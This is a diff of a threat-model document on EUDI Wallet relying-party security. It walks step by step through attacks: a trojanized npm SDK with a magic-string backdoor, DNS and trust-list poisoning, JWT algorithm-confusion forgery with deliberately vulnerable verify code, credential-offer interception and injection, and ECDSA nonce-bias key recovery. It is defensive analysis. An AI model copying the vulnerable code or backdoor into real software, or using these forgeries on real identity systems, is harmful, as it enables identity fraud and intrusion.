@@ -21772,7 +22376,8 @@ The RP Server logically peels back the JWS/JWE envelopes natively within its sec
 
 
 </details>
-<details><summary><strong>3. RP Server persists raw identifying fields into RP Database</strong></summary>
+<details>
+<summary><strong>3. RP Server persists raw identifying fields into RP Database</strong></summary>
 
 Acting in standard enterprise fashion—but violating stringent eIDAS/GDPR data minimization statutes—the backend writes these sensitive plaintext traits systematically to a durable data store for "analytics" or convenience.
 
@@ -21786,7 +22391,8 @@ VALUES ('8f14-49c0', 170560012, 'Ivan Stambuk', '1980-01-01');
 **Artifact Produced:** Persistent plaintext identity row (Database layer).
 
 </details>
-<details><summary><strong>4. External Threat Actor exploits backend vulnerability on RP Database</strong></summary>
+<details>
+<summary><strong>4. External Threat Actor exploits backend vulnerability on RP Database</strong></summary>
 
 Months later, an opportunistic ransomware gang or fully automated SQL vulnerability scanner independently penetrates the RP's external corporate perimeter, gaining unauthorized shell access to the internal network.
 
@@ -21797,7 +22403,8 @@ SELECT * FROM user_analytics;
 ```
 
 </details>
-<details><summary><strong>5. External Threat Actor mass exfiltrates sensitive tables from RP Database</strong></summary>
+<details>
+<summary><strong>5. External Threat Actor mass exfiltrates sensitive tables from RP Database</strong></summary>
 
 The attacker instantaneously dumps the contents of the centralized database, acquiring tens of thousands of highly sensitive citizen profiles (including the permanently linked cryptographic tracking hashes) without ever needing to interact with, exploit, or mathematically compromise a single EUDI Wallet device.
 
@@ -21874,7 +22481,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Supply Chain Attacker compromises EUDI Wallet SDK on Package Registry</strong></summary>
+<details>
+<summary><strong>1. Supply Chain Attacker compromises EUDI Wallet SDK on Package Registry</strong></summary>
 
 A highly resourced State Actor or advanced organized collective targets a critical upstream dependency utilized by the RP's EUDI verification stack (e.g., a popular open-source OpenID4VP parsing package on npm or Maven), stealthily pushing a trojanized version update to public repositories.
 
@@ -21885,7 +22493,8 @@ npm publish @eudi/wallet-core-verifier@1.4.2 --access public
 ```
 
 </details>
-<details><summary><strong>2. RP Server automated CI/CD pipeline pulls update from Package Registry</strong></summary>
+<details>
+<summary><strong>2. RP Server automated CI/CD pipeline pulls update from Package Registry</strong></summary>
 
 The Relying Party's automated DevOps pipeline unknowingly fetches the compromised dependency during a routine scheduled build cycle, seamlessly integrating the malicious parser logic directly into the enterprise artifact.
 
@@ -21920,14 +22529,16 @@ The Relying Party's automated DevOps pipeline unknowingly fetches the compromise
 **Artifact Produced:** Compromised `node_modules` dependency source (Infrastructure layer).
 
 </details>
-<details><summary><strong>3. RP Server deploys backdoored library into Production</strong></summary>
+<details>
+<summary><strong>3. RP Server deploys backdoored library into Production</strong></summary>
 
 The compromised verification architecture is seamlessly promoted to live production environments actively serving civilian transactions, completely bypassing internal security audits which only scrutinize first-party code.
 
 **Artifact Produced:** Trojanized production backend instance (Infrastructure layer).
 
 </details>
-<details><summary><strong>4. Supply Chain Attacker submits fabricated token to RP Server</strong></summary>
+<details>
+<summary><strong>4. Supply Chain Attacker submits fabricated token to RP Server</strong></summary>
 
 The Attacker explicitly crafts a mathematically absurd or totally un-signed presentation payload intentionally structured with a specific magic signature to trigger the backdoor, and submits it directly to the RP's presentation endpoints.
 
@@ -21942,7 +22553,8 @@ vp_token=BACKDOOR_MAGIC_STRING_XYZ_admin_access
 **Artifact Produced:** Fabricated synthetic `vp_token` payload (Network layer).
 
 </details>
-<details><summary><strong>5. RP Server SDK bypasses cryptographic checks</strong></summary>
+<details>
+<summary><strong>5. RP Server SDK bypasses cryptographic checks</strong></summary>
 
 Conditioned by the embedded trojan logic within the supply chain stack, the internal validation software deliberately skips crucial SD-JWT ECDSA checks when encountering specific attacker flags, silently validating the fake token and granting devastating access to internal networks.
 
@@ -21964,7 +22576,8 @@ async function validateCredential(vpToken) {
 ```
 
 </details>
-<details><summary><strong>6. RP Server grants high-assurance access to Attacker</strong></summary>
+<details>
+<summary><strong>6. RP Server grants high-assurance access to Attacker</strong></summary>
 
 The RP's application layer — oblivious to the underlying SDK compromise — accepts the validation result at face value and grants the Attacker a fully authenticated session with the privileges associated with the fabricated identity. From the RP's perspective, this is indistinguishable from a legitimate EUDI Wallet presentation.
 
@@ -22083,7 +22696,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Wallet Provider detects security breach and notifies MS Authority</strong></summary>
+<details>
+<summary><strong>1. Wallet Provider detects security breach and notifies MS Authority</strong></summary>
 
 The Wallet Provider detects a security incident affecting its Wallet Solution infrastructure — e.g., malicious access to critical systems (Annex I criterion (b)), compromise of the WSCD key management subsystem, or data breach affecting >1% of active Wallet Units (criterion (f)). Under CIR 2025/847 Art. 3, the Wallet Provider is **legally obligated** to notify the Member State's designated authority (typically the national CSIRT or the supervisory body identified under Art. 46a) within 24 hours of breach detection.
 
@@ -22105,7 +22719,8 @@ The Wallet Provider detects a security incident affecting its Wallet Solution in
 **Artifact Produced:** CIR 2025/847 breach notification submitted by the Wallet Provider to the MS Authority.
 
 </details>
-<details><summary><strong>2. MS Authority evaluates breach severity against Annex I criteria</strong></summary>
+<details>
+<summary><strong>2. MS Authority evaluates breach severity against Annex I criteria</strong></summary>
 
 The MS Authority assesses the breach against the CIR 2025/847 Annex I severity matrix. The criteria include: (a) duration exceeding 12 hours; (b) malicious access to critical systems; (c) impact on more than one Member State; (d) affecting >1% of Wallet Units; (e) recurring incident within 6 months; (f) data compromise; (g) cancelled certification. If **two or more criteria** are triggered, the incident is classified as a **significant breach** requiring suspension consideration under Art. 5a(7).
 
@@ -22114,7 +22729,8 @@ The MS Authority assesses the breach against the CIR 2025/847 Annex I severity m
 **Artifact Produced:** MS Authority breach severity assessment classifying the incident as significant or non-significant under Annex I.
 
 </details>
-<details><summary><strong>3. MS Authority issues suspension decision and updates certified wallet list</strong></summary>
+<details>
+<summary><strong>3. MS Authority issues suspension decision and updates certified wallet list</strong></summary>
 
 Upon determining a significant breach, the MS Authority issues a formal suspension decision under Art. 5a(7). The decision triggers two parallel actions: (a) a CIRAS notification broadcast to all registered ecosystem participants (RPs, PID Providers, other MS authorities); and (b) an update to the certified wallet list maintained under CIR 2025/849, changing the Wallet Solution's status from `CERTIFIED` to `SUSPENDED`. The suspension initiates a **3-month remediation window** (Art. 7(1)) — if the Wallet Provider fails to remediate within this period, withdrawal is automatic and irrevocable (Art. 8(1)).
 
@@ -22136,7 +22752,8 @@ Upon determining a significant breach, the MS Authority issues a formal suspensi
 **Artifact Produced:** CIRAS suspension notification broadcast + certified wallet list status update.
 
 </details>
-<details><summary><strong>4. RP Server receives suspension notification via CIRAS</strong></summary>
+<details>
+<summary><strong>4. RP Server receives suspension notification via CIRAS</strong></summary>
 
 The RP's trust management service receives the CIRAS suspension notification. The RP must process this notification and initiate its incident response playbook (§21.7.4). For RPs that have not yet integrated CIRAS (available from May 2026), the notification may arrive via MS-defined backup channels (email, API, or manual publication on the eIDAS Dashboard). RPs without any notification subscription learn of the suspension only through periodic certified wallet list polling — creating a dangerous window where compromised presentations may still be accepted.
 
@@ -22147,7 +22764,8 @@ The RP's trust management service receives the CIRAS suspension notification. Th
 **Artifact Produced:** CIRAS notification received and parsed by the RP's trust management service.
 
 </details>
-<details><summary><strong>5. RP Server invalidates cached WUA trust anchors for suspended solution</strong></summary>
+<details>
+<summary><strong>5. RP Server invalidates cached WUA trust anchors for suspended solution</strong></summary>
 
 The RP's trust management service removes or flags the suspended Wallet Solution's WUA (Wallet Unit Attestation) trust material from its local cache. This includes: (a) removing the Wallet Provider's WUA signing key from the trusted key set; (b) marking all cached WUAs issued by this solution as `UNTRUSTED`; (c) updating the DCQL pipeline to reject presentations accompanied by WUAs from the suspended solution. The invalidation must be atomic — partial invalidation risks inconsistent verification outcomes across the RP's server fleet.
 
@@ -22172,7 +22790,8 @@ Authorization: Bearer internal_service_token
 **Artifact Produced:** Updated RP trust configuration with suspended Wallet Solution's WUA trust material removed from the active set.
 
 </details>
-<details><summary><strong>6. RP Server rejects in-flight verification sessions from suspended Wallet Units</strong></summary>
+<details>
+<summary><strong>6. RP Server rejects in-flight verification sessions from suspended Wallet Units</strong></summary>
 
 Any active OID4VP sessions initiated by Wallet Units from the suspended solution now fail at the VP verification stage. The RP's verification pipeline detects that the WUA accompanying the VP was issued by the now-untrusted Wallet Solution and rejects the presentation. The user sees a verification failure — but unlike a standard error, the RP must provide a meaningful, non-alarming error message explaining that their Wallet Solution is temporarily unavailable and offering alternative authentication paths.
 
@@ -22194,7 +22813,8 @@ Any active OID4VP sessions initiated by Wallet Units from the suspended solution
 **Artifact Produced:** User-facing error response with fallback authentication options for affected Wallet Users.
 
 </details>
-<details><summary><strong>7. RP Server activates fallback authentication for affected users</strong></summary>
+<details>
+<summary><strong>7. RP Server activates fallback authentication for affected users</strong></summary>
 
 The RP activates pre-configured fallback authentication paths for users whose primary Wallet Solution is suspended. Fallback options depend on the RP's architecture: (a) accepting presentations from alternative, non-suspended EUDI Wallet Solutions (requires multi-wallet support); (b) falling back to the national eID scheme (e.g., DigiD in NL, FranceConnect in FR); (c) manual identification via customer support with physical document verification. The RP must balance security (maintaining assurance levels) with availability (not locking users out of critical services). For financial RPs, PSD2 Art. 97 SCA requirements may constrain which fallback methods are acceptable.
 
@@ -22279,7 +22899,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. RP initiates scheduled LoTE refresh — DNS resolution</strong></summary>
+<details>
+<summary><strong>1. RP initiates scheduled LoTE refresh — DNS resolution</strong></summary>
 
 The RP's trust management service triggers a periodic refresh of the List of Trusted Entities (LoTE) — the authoritative registry of Access CAs, PID Providers, and Attestation Providers maintained by each Member State (§5.5). The refresh cycle is governed by the LoTE's TTL and the RP's caching policy (§31.2.2). The RP's resolver issues a DNS query for the LoTE endpoint hostname.
 
@@ -22298,14 +22919,16 @@ lote.ms-authority.eu.    300    IN    A    198.51.100.66
 **Artifact Produced:** DNS query for `lote.ms-authority.eu` to resolve the LoTE endpoint IP address.
 
 </details>
-<details><summary><strong>2. DNS hijack redirects to attacker-controlled IP</strong></summary>
+<details>
+<summary><strong>2. DNS hijack redirects to attacker-controlled IP</strong></summary>
 
 The attacker has compromised the DNS resolution path between the RP and the legitimate LoTE endpoint — either through DNS cache poisoning (Kaminsky-style), BGP route manipulation to intercept traffic to the LoTE authority's IP range, or compromise of the RP's local DNS resolver. The DNS response returns the attacker's IP address instead of the legitimate LoTE server.
 
 **Artifact Produced:** Poisoned DNS response — RP will connect to attacker-controlled IP on next HTTPS request.
 
 </details>
-<details><summary><strong>3. RP establishes TLS connection to attacker infrastructure</strong></summary>
+<details>
+<summary><strong>3. RP establishes TLS connection to attacker infrastructure</strong></summary>
 
 The RP initiates an HTTPS connection to the attacker's IP (believing it is the legitimate LoTE endpoint). If the attacker has obtained a valid TLS certificate for the LoTE domain — via a compromised or negligent CA, a misissued certificate, or BGP hijack during DV certificate issuance — the TLS handshake succeeds. The RP's TLS client sees a valid certificate chain and proceeds.
 
@@ -22339,7 +22962,8 @@ ServerHello ← 198.51.100.66
 **Artifact Produced:** Established TLS session to attacker infrastructure with valid (misissued) certificate.
 
 </details>
-<details><summary><strong>4. Attacker serves poisoned LoTE with injected trust anchors</strong></summary>
+<details>
+<summary><strong>4. Attacker serves poisoned LoTE with injected trust anchors</strong></summary>
 
 The attacker returns a modified LoTE JSON response that includes all legitimate trust anchors (to avoid detection) plus one or more rogue entries: a fake Access CA (whose root certificate the attacker controls) and/or a fake PID Provider. The injected entries use plausible entity identifiers and metadata.
 
@@ -22366,7 +22990,8 @@ The attacker returns a modified LoTE JSON response that includes all legitimate 
 **Artifact Produced:** Poisoned LoTE JSON containing injected rogue PID Provider and/or Access CA entries alongside legitimate entries.
 
 </details>
-<details><summary><strong>5. RP deserialises LoTE without verifying signature</strong></summary>
+<details>
+<summary><strong>5. RP deserialises LoTE without verifying signature</strong></summary>
 
 The RP's trust management service deserialises the LoTE response. If the RP does not verify the LoTE's cryptographic signature against a **pinned** Trust Anchor root key (distinct from the refreshable LoTE content), the poisoned entries are silently accepted. The RP treats LoTE freshness (§31.2.2) as the only validation — checking that the LoTE was fetched recently, but not verifying its integrity.
 
@@ -22375,14 +23000,16 @@ The RP's trust management service deserialises the LoTE response. If the RP does
 **Artifact Produced:** LoTE JSON parsed — no signature verification failure detected (because no verification was attempted).
 
 </details>
-<details><summary><strong>6. RP updates local trust store with poisoned anchors</strong></summary>
+<details>
+<summary><strong>6. RP updates local trust store with poisoned anchors</strong></summary>
 
 The rogue Access CA and PID Provider certificates are merged into the RP's local trust store. They are now indistinguishable from legitimate trust anchors in the RP's verification pipeline. The poisoning persists until the next legitimate LoTE refresh (which requires the DNS hijack to be resolved) or until a manual audit detects the extra entries.
 
 **Artifact Produced:** Updated local trust store with rogue entries integrated into the trusted set.
 
 </details>
-<details><summary><strong>7. Attacker submits forged VP with credential from rogue issuer</strong></summary>
+<details>
+<summary><strong>7. Attacker submits forged VP with credential from rogue issuer</strong></summary>
 
 The attacker constructs a forged SD-JWT VC (or mdoc) signed by the rogue PID Provider's key. They present this forged credential to the RP via the standard OID4VP flow — submitting a VP containing the forged credential and a KB-JWT to the RP's `response_uri`.
 
@@ -22409,7 +23036,8 @@ vp_token=eyJhbGciOiJFUzI1NiIsInR5cCI6InZjK3NkLWp3dCIsImtpZCI6InJvZ3VlLXBp
 **Artifact Produced:** Forged VP submitted to RP, containing SD-JWT VC signed by the rogue PID Provider.
 
 </details>
-<details><summary><strong>8. RP validates forged credential against poisoned trust store</strong></summary>
+<details>
+<summary><strong>8. RP validates forged credential against poisoned trust store</strong></summary>
 
 The RP's verification pipeline validates the issuer's signature against the trust store — and finds the rogue PID Provider's certificate in the poisoned LoTE. The cryptographic validation succeeds. The RP accepts the forged identity and creates an authenticated session.
 
@@ -22489,7 +23117,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Attacker obtains issuer's public key from JWKS endpoint</strong></summary>
+<details>
+<summary><strong>1. Attacker obtains issuer's public key from JWKS endpoint</strong></summary>
 
 The attacker retrieves the PID Provider's (or RP's) public key from a publicly accessible source. For PID Provider keys: the issuer's JWK Set is available at `.well-known/openid-credential-issuer`. For RP keys: the WRPAC certificate is published via Certificate Transparency logs (§5.2.4) or embedded in the `x5c` header of the RP's JARs. The public key is inherently public — this is not a compromise. The vulnerability lies in the *misuse* of this public key for symmetric verification.
 
@@ -22509,7 +23138,8 @@ The attacker retrieves the PID Provider's (or RP's) public key from a publicly a
 **Artifact Produced:** Extracted EC public key bytes from the issuer's published JWK Set.
 
 </details>
-<details><summary><strong>2. Attacker forges SD-JWT VC with algorithm substitution</strong></summary>
+<details>
+<summary><strong>2. Attacker forges SD-JWT VC with algorithm substitution</strong></summary>
 
 The attacker modifies the JWT header to specify `alg: HS256` (HMAC-SHA256, a symmetric algorithm) instead of the expected `alg: ES256` (ECDSA P-256, an asymmetric algorithm). The attacker then forges the JWT payload with arbitrary claims — a fabricated PID with any name, date of birth, or nationality — and computes the HMAC-SHA256 signature using the raw bytes of the issuer's public key as the symmetric secret.
 
@@ -22530,21 +23160,24 @@ The attacker modifies the JWT header to specify `alg: HS256` (HMAC-SHA256, a sym
 **Artifact Produced:** Forged SD-JWT VC with `alg: HS256` header and arbitrary PID claims.
 
 </details>
-<details><summary><strong>3. Attacker submits forged VP to RP</strong></summary>
+<details>
+<summary><strong>3. Attacker submits forged VP to RP</strong></summary>
 
 The attacker constructs a Verifiable Presentation containing the forged SD-JWT VC and a KB-JWT (also signed with the attacker's own key). The VP is submitted to the RP's `response_uri` via `direct_post`, appearing as a normal wallet response to a verification request. The RP's backend receives the VP and passes the SD-JWT VC to its verification SDK.
 
 **Artifact Produced:** Forged VP submitted to the RP's `response_uri` containing the alg-substituted SD-JWT VC.
 
 </details>
-<details><summary><strong>4. RP passes JWT to verification SDK</strong></summary>
+<details>
+<summary><strong>4. RP passes JWT to verification SDK</strong></summary>
 
 The RP's business logic receives the VP and extracts the SD-JWT VC. It passes the JWT to the verification SDK along with the issuer's public key (fetched from the JWK Set or cached locally). The RP expects the SDK to verify the credential's authenticity.
 
 **Artifact Produced:** SDK invocation: `verify(jwt, issuer_public_key)`.
 
 </details>
-<details><summary><strong>5. Vulnerable SDK trusts attacker-supplied algorithm header</strong></summary>
+<details>
+<summary><strong>5. Vulnerable SDK trusts attacker-supplied algorithm header</strong></summary>
 
 The SDK reads the `alg` header from the JWT to determine which verification algorithm to use. A vulnerable SDK implementation — one that trusts the JWT's self-declared algorithm rather than enforcing an explicit allowlist — routes the verification to the HMAC-SHA256 code path. It uses the issuer's public key (passed as the verification key) as the HMAC secret.
 
@@ -22552,8 +23185,8 @@ The SDK reads the `alg` header from the JWT to determine which verification algo
 
 ```javascript
 // ⚠️ VULNERABLE SDK implementation — trusts JWT-supplied algorithm
-// This pattern was found in jwt-simple, node-jsonwebtoken (<4.2.2),
-// PyJWT (<0.4.3), and php-jwt (<2.0) among others.
+// This pattern was found in jwt-simple, node-jsonwebtoken (&lt;4.2.2),
+// PyJWT (&lt;0.4.3), and php-jwt (&lt;2.0) among others.
 
 function verify(jwt, key) {
   const [headerB64, payloadB64, signature] = jwt.split(".");
@@ -22562,15 +23195,15 @@ function verify(jwt, key) {
   // ⚠️ ROOT CAUSE: algorithm selected from attacker-controlled header
   switch (header.alg) {
     case "ES256":
-      return ecdsaVerify("P-256", key, signature, `${headerB64}.${payloadB64}`);
+      return ecdsaVerify("P-256", key, signature, `$\{headerB64\}.${payloadB64}`);
     case "HS256":
       // ⚠️ Treats the EC public key as an HMAC secret!
       // The attacker set alg: HS256 and signed with the same public key bytes.
-      return hmacVerify("SHA-256", key, signature, `${headerB64}.${payloadB64}`);
+      return hmacVerify("SHA-256", key, signature, `$\{headerB64\}.${payloadB64}`);
     case "none":
       return true; // ⚠️ No signature verification at all
     default:
-      return ecdsaVerify(header.alg, key, signature, `${headerB64}.${payloadB64}`);
+      return ecdsaVerify(header.alg, key, signature, `$\{headerB64\}.${payloadB64}`);
   }
 }
 
@@ -22581,7 +23214,8 @@ function verify(jwt, key) {
 **Artifact Produced:** SDK selects HMAC-SHA256 verification path using the issuer's public key bytes as the symmetric secret.
 
 </details>
-<details><summary><strong>6. SDK returns VALID — HMAC signature matches</strong></summary>
+<details>
+<summary><strong>6. SDK returns VALID — HMAC signature matches</strong></summary>
 
 Because the attacker computed the HMAC using the same public key bytes that the SDK is now using as the HMAC secret, the signature verification succeeds. The SDK returns `VALID` to the RP. From the RP's perspective, the credential has been cryptographically verified — there is no indication that anything is wrong.
 
@@ -22611,7 +23245,8 @@ console.log(computedHmac.equals(forgedSignature)); // true ⚠️
 **Artifact Produced:** Verification SDK returns `VALID` for the forged credential.
 
 </details>
-<details><summary><strong>7. RP creates authenticated session from forged identity</strong></summary>
+<details>
+<summary><strong>7. RP creates authenticated session from forged identity</strong></summary>
 
 The RP's business logic receives a "verified" credential from the SDK and proceeds with session creation. The forged PID attributes are accepted as authentic — the attacker gains an authenticated session with a fabricated identity. For financial RPs, this enables account opening (§22), payment authorisation (§15), or any operation gated by PID verification.
 
@@ -22695,7 +23330,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. RP (acting as Issuer) generates Credential Offer</strong></summary>
+<details>
+<summary><strong>1. RP (acting as Issuer) generates Credential Offer</strong></summary>
 
 The RP — acting in its issuer capacity (§15.4 for SCA attestations, §15.15 for EAA issuance) — generates a Credential Offer containing a `pre-authorized_code`. This code grants one-time access to the Token Endpoint without requiring the user to authenticate again (the user was already authenticated via the banking session). The offer is delivered to the user via QR code displayed on a web page, a deep link in an SMS/push notification, or an in-app redirect.
 
@@ -22719,7 +23355,8 @@ The RP — acting in its issuer capacity (§15.4 for SCA attestations, §15.15 f
 **Artifact Produced:** Credential Offer JSON with pre-authorized code and optional `tx_code` requirement.
 
 </details>
-<details><summary><strong>2. Attacker intercepts the Credential Offer</strong></summary>
+<details>
+<summary><strong>2. Attacker intercepts the Credential Offer</strong></summary>
 
 The attacker obtains the Credential Offer through one of several channels: (a) **shoulder-surfing** the QR code displayed on the user's screen in a public setting; (b) **deep link interception** via a malicious app registered for the same URI scheme (Android Intent filter collision or iOS Universal Link misconfiguration); (c) **network interception** if the delivery channel (SMS, push notification) is compromised; or (d) **social engineering** — the attacker tricks the user into sharing the QR code ("Send me a screenshot of your banking screen").
 
@@ -22728,7 +23365,8 @@ The attacker obtains the Credential Offer through one of several channels: (a) *
 **Artifact Produced:** Intercepted pre-authorized code value `PAC_x9y8z7`.
 
 </details>
-<details><summary><strong>3. Attacker redeems code at Token Endpoint</strong></summary>
+<details>
+<summary><strong>3. Attacker redeems code at Token Endpoint</strong></summary>
 
 The attacker immediately submits the intercepted pre-authorized code to the RP's Token Endpoint. If the RP does not require a `tx_code` (transaction code), the Token Endpoint accepts the pre-authorized code and returns an access token and a `c_nonce` for proof-of-possession.
 
@@ -22746,7 +23384,8 @@ If `tx_code` IS required, the attacker's redemption fails at this step — the `
 **Artifact Produced:** Access token + `c_nonce` (if `tx_code` not enforced); HTTP 400 error (if `tx_code` enforced).
 
 </details>
-<details><summary><strong>4. Attacker requests credential bound to their key</strong></summary>
+<details>
+<summary><strong>4. Attacker requests credential bound to their key</strong></summary>
 
 With the access token in hand, the attacker calls the Credential Endpoint with a proof-of-possession JWT signed by their own private key. The issuer binds the resulting credential's `cnf` claim to the attacker's public key — the credential is now permanently bound to the attacker's wallet.
 
@@ -22769,7 +23408,8 @@ Content-Type: application/json
 **Artifact Produced:** SCA attestation (or EAA) issued to the attacker's key, carrying the legitimate user's authorised attributes.
 
 </details>
-<details><summary><strong>5. Legitimate user's redemption attempt fails</strong></summary>
+<details>
+<summary><strong>5. Legitimate user's redemption attempt fails</strong></summary>
 
 When the legitimate user finally scans the QR code and attempts to redeem the pre-authorized code, the Token Endpoint rejects it — the code has already been consumed by the attacker. The user receives an error. Depending on the RP's UX, this may appear as a generic "offer expired" message, masking the attack.
 
@@ -22856,14 +23496,16 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Attacker authenticates to PID Provider using own identity</strong></summary>
+<details>
+<summary><strong>1. Attacker authenticates to PID Provider using own identity</strong></summary>
 
 The attacker authenticates to a PID Provider (or QEAA Provider) using their own legitimate identity. This is not an impersonation — the attacker presents their own credentials at the issuer's identity proofing step. The attacker genuinely intends to get a credential issued to their own name, but their goal is not to use it themselves — it is to inject it into the victim's wallet.
 
 **Artifact Produced:** Authenticated session at the PID Provider under the attacker's real identity.
 
 </details>
-<details><summary><strong>2. Issuer returns authorization code and Credential Offer URI</strong></summary>
+<details>
+<summary><strong>2. Issuer returns authorization code and Credential Offer URI</strong></summary>
 
 The PID Provider verifies the attacker's identity and issues an authorization code tied to the attacker's PID attributes (name, date of birth, nationality). The issuer also generates a `credential_offer_uri` — a URL that any wallet can use to redeem the authorization code and receive the credential. At this point, the issuance is entirely legitimate.
 
@@ -22888,14 +23530,16 @@ The PID Provider verifies the attacker's identity and issues an authorization co
 **Artifact Produced:** Valid authorization code and Credential Offer URI, both tied to the attacker's authenticated identity.
 
 </details>
-<details><summary><strong>3. Attacker delivers Credential Offer to victim's device</strong></summary>
+<details>
+<summary><strong>3. Attacker delivers Credential Offer to victim's device</strong></summary>
 
 Instead of accepting the credential into their own wallet, the attacker redirects the Credential Offer to the victim's device. Delivery channels include: (a) a QR code presented in person ("Scan this to set up your digital ID"); (b) a deep link sent via messaging; (c) NFC tap in a social engineering scenario. The victim's device opens the Wallet app and displays the incoming Credential Offer.
 
 **Artifact Produced:** Credential Offer delivered to victim's Wallet via social engineering channel.
 
 </details>
-<details><summary><strong>4. Victim accepts Credential Offer without verifying subject identity</strong></summary>
+<details>
+<summary><strong>4. Victim accepts Credential Offer without verifying subject identity</strong></summary>
 
 The victim's Wallet displays a consent screen prompting the user to accept a credential from the named issuer. If the Wallet's consent screen does not prominently display the *subject* of the credential (the attacker's name and identity attributes), the victim has no way to detect the attack. The victim sees "PID Provider wants to issue a credential" and taps "Accept" without realising the credential contains someone else's identity.
 
@@ -22904,7 +23548,8 @@ The victim's Wallet displays a consent screen prompting the user to accept a cre
 **Artifact Produced:** User consent granted — Wallet proceeds to redeem the Credential Offer.
 
 </details>
-<details><summary><strong>5. Victim's Wallet redeems authorization code at Token Endpoint</strong></summary>
+<details>
+<summary><strong>5. Victim's Wallet redeems authorization code at Token Endpoint</strong></summary>
 
 The victim's Wallet redeems the authorization code at the issuer's Token Endpoint. The issuer returns an access token. The Wallet then calls the Credential Endpoint with a proof-of-possession (`proof` JWT) signed by the victim's wallet key pair. This proof binds the credential's `cnf` claim to the victim's key.
 
@@ -22923,7 +23568,7 @@ HTTP/1.1 200 OK
 
 ```json
 // Proof-of-possession JWT in Credential Request — signed by VICTIM's wallet key
-// POST /credential with header: Authorization: DPoP <access_token>
+// POST /credential with header: Authorization: DPoP &lt;access_token>
 {
   "format": "vc+sd-jwt",
   "credential_configuration_id": "eu.europa.ec.eudi.pid_jwt_vc_json",
@@ -22941,7 +23586,8 @@ HTTP/1.1 200 OK
 **Artifact Produced:** Proof-of-possession JWT signed by victim's wallet key, submitted to the Credential Endpoint.
 
 </details>
-<details><summary><strong>6. Issuer returns credential with attacker's identity bound to victim's key</strong></summary>
+<details>
+<summary><strong>6. Issuer returns credential with attacker's identity bound to victim's key</strong></summary>
 
 The issuer binds the credential's `cnf` claim to the victim's wallet key — creating a credential where the *subject attributes* (name, DOB) are the attacker's, but the *holder key* is the victim's. The credential is cryptographically valid: the issuer signed it, and the victim can prove possession via the KB-JWT.
 
@@ -22982,14 +23628,16 @@ The issuer binds the credential's `cnf` claim to the victim's wallet key — cre
 **Artifact Produced:** SD-JWT VC with subject = attacker's identity, cnf = victim's wallet key. Valid issuer signature.
 
 </details>
-<details><summary><strong>7. Victim presents attacker's identity to RP</strong></summary>
+<details>
+<summary><strong>7. Victim presents attacker's identity to RP</strong></summary>
 
 At a later time, the victim uses the injected credential to authenticate at an RP. The victim may not even realise they are presenting the wrong credential — if they have only one PID in their wallet, it is selected automatically. The victim constructs a VP containing the injected credential and a KB-JWT signed with their wallet key.
 
 **Artifact Produced:** VP containing attacker's PID credential, holder-bound to victim's wallet key, submitted to RP.
 
 </details>
-<details><summary><strong>8. RP authenticates victim under attacker's identity</strong></summary>
+<details>
+<summary><strong>8. RP authenticates victim under attacker's identity</strong></summary>
 
 The RP verifies the credential through the standard pipeline: issuer signature ✅, status check (not revoked) ✅, KB-JWT holder binding ✅, nonce freshness ✅. Every verification step passes. The RP creates a session under the attacker's identity — the victim unknowingly acts as the attacker.
 
@@ -23072,21 +23720,24 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. RP signs JAR with ECDSA for each verification session</strong></summary>
+<details>
+<summary><strong>1. RP signs JAR with ECDSA for each verification session</strong></summary>
 
 In the normal OID4VP flow, the RP generates a signed JAR (JWT-based Authorization Request) for every verification session. The JAR is signed using the RP's WRPAC private key with the ES256 algorithm (ECDSA on the P-256 curve). Each signature uses a unique per-signature nonce `k` — either randomly generated or deterministically derived (RFC 6979). In a correct implementation, `k` is uniformly distributed across `[1, n-1]`.
 
 **Artifact Produced:** Signed JAR with ECDSA `(r, s)` signature over the JAR payload.
 
 </details>
-<details><summary><strong>2. JAR is publicly accessible via request_uri endpoint</strong></summary>
+<details>
+<summary><strong>2. JAR is publicly accessible via request_uri endpoint</strong></summary>
 
 The signed JAR is served from the RP's `request_uri` endpoint, which is publicly accessible without authentication (the Wallet must be able to fetch it). The attacker does not need to interact with the RP or compromise any system — they simply observe or fetch the JARs from the publicly accessible endpoint. For high-traffic RPs (banking, government), this yields hundreds of signatures per day.
 
 **Artifact Produced:** JAR fetched from public `request_uri` endpoint — signature observable to any network participant.
 
 </details>
-<details><summary><strong>3. Attacker extracts (r, s, hash) tuples from collected JARs</strong></summary>
+<details>
+<summary><strong>3. Attacker extracts (r, s, hash) tuples from collected JARs</strong></summary>
 
 The attacker parses each collected JAR's JWS, extracting the ECDSA signature components `(r, s)` from the base64-decoded signature field, and the SHA-256 hash of the signed payload. Over weeks or months, the attacker accumulates `n ≥ 200` tuples. Collection is entirely passive — no interaction with the RP is needed.
 
@@ -23116,14 +23767,16 @@ The attacker parses each collected JAR's JWS, extracting the ECDSA signature com
 **Artifact Produced:** Collection of `n` ECDSA `(r, s, hash(message))` tuples from the RP's JAR signatures.
 
 </details>
-<details><summary><strong>4. Attacker submits collected signatures for lattice analysis</strong></summary>
+<details>
+<summary><strong>4. Attacker submits collected signatures for lattice analysis</strong></summary>
 
 The attacker feeds the collected `(r, s, hash)` tuples to a lattice cryptanalysis framework (e.g., a custom SageMath script, or the publicly available tools based on Howgrave-Graham and Smart's 2001 attack). The framework requires only the signature tuples and the public key — both of which are publicly available.
 
 **Artifact Produced:** Input dataset prepared for lattice-based private key recovery.
 
 </details>
-<details><summary><strong>5. Statistical analysis detects nonce bias</strong></summary>
+<details>
+<summary><strong>5. Statistical analysis detects nonce bias</strong></summary>
 
 The analysis framework performs statistical tests on the collected nonces (indirectly, through the `(r, s)` pairs). It detects bias patterns: (a) truncated RNG output (nonce values consistently below `n/2`, indicating MSB always 0); (b) modular reduction bias (`k = random_bytes mod n` instead of rejection sampling); (c) side-channel leakage from timing-dependent scalar multiplication in the signing HSM. Even a 1-bit bias in the MSB or LSB of `k` is exploitable.
 
@@ -23132,7 +23785,8 @@ The analysis framework performs statistical tests on the collected nonces (indir
 **Artifact Produced:** Statistical confirmation of nonce bias pattern + HNP instance formulation.
 
 </details>
-<details><summary><strong>6. Lattice reduction constructs and solves HNP</strong></summary>
+<details>
+<summary><strong>6. Lattice reduction constructs and solves HNP</strong></summary>
 
